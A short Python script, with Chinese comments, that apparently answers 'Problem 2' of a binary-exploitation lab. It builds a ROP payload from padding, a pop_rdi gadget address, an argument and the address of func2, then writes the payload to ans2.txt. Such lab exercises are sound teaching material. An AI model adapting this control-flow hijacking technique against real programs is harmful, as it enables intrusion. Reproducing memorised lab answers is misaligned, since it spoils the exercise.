import struct

# 填充 16 字节垃圾数据
padding = b"A" * 16

# pop_rdi gadget 的地址
pop_rdi_addr = struct.pack("<Q", 0x4012c7)

# 传给 func2 的参数值 0x3f8
arg1 = struct.pack("<Q", 0x3f8)

# func2 的起始地址
func2_addr = struct.pack("<Q", 0x401216)

# 组合 Payload: Padding + Gadget + 参数 + 目标函数
payload = padding + pop_rdi_addr + arg1 + func2_addr

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Problem 2 Payload generated!")